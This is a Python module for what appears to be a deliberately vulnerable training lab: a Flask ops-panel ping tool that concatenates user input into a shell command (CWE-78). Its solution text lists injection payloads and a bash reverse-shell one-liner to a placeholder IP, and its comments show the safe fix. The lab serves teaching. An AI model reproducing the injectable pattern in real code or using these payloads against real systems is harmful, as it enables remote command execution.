"""运维面板里的网络诊断工具 —— 命令注入。

业务场景是"内网运维面板"：值班同学要确认某台机器通不通，页面上提供了一个
ping 输入框。它背后是 `subprocess.getoutput("ping ... " + 用户输入)`。
"""

import subprocess

from vuln4all import Vuln, render_template, request

QUICK = ("127.0.0.1", "localhost", "gateway", "8.8.8.8")


class PingTool(Vuln):
    info = {
        "name": "网络诊断工具里的命令注入",
        "author": ["guaidao2"],
        "cwe": "CWE-78",
        "owasp": "A03:2021 - Injection",
        "difficulty": "进阶",
        "description": (
            "运维面板的连通性检测把「主机名」拼进了 shell 命令里执行。"
            "shell 的元字符（分号、管道、反引号……）都能帮你插进一条自己的命令。"
        ),
        "hint": (
            "先 ping 一下 127.0.0.1 看看正常输出长什么样。"
            "然后想：这个字符串最终会被交给谁执行？如果交给的是 shell，"
            "那么 `;`、`&&`、`|`、反引号、`$()` 这些字符在 shell 里是什么意思？"
            "空格被过滤了也不用慌，shell 里还有别的办法分隔命令。"
        ),
        "solution": (
            "在主机名里塞一条新命令：\n\n"
            "  127.0.0.1; id\n"
            "  127.0.0.1 && id\n"
            "  127.0.0.1 | id\n"
            "  127.0.0.1$(id)\n"
            "  `id`\n\n"
            "页面判断通关的条件是输出里出现 uid= —— 所以 `; id` 最直接。\n\n"
            "进阶：如果只有回显能不能拿 shell？\n"
            "  ; bash -i >& /dev/tcp/<你的ip>/4444 0>&1\n"
            "（这题不需要真反弹，理解链路就行）"
        ),
        "refs": [
            "https://owasp.org/www-community/attacks/Command_Injection",
            "https://portswigger.net/web-security/os-command-injection",
        ],
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/", methods=["GET", "POST"])
        def index():
            host = ""
            command = None
            output = None

            if request.method == "POST":
                host = request.form.get("host", "")

                # ↓↓↓ 洞就在这里：用户输入拼进了交给 shell 执行的字符串 ↓↓↓
                command = "ping -c 1 -W 1 " + host
                output = subprocess.getoutput(command)
                # ↑↑↑ 正确做法：subprocess.run(["ping", "-c", "1", "-W", "1", host]) ↑↑↑
                #     用一个 list 传参数，shell 根本不参与，元字符就失去了意义；
                #     而且仍然要校验 host 是不是真的像个主机名（白名单正则）↑↑↑

            return render_template(
                "index.html",
                host=host,
                command=command,
                output=output,
                quick=QUICK,
                hit=bool(output) and "uid=" in output,
            )

        return {"": app}
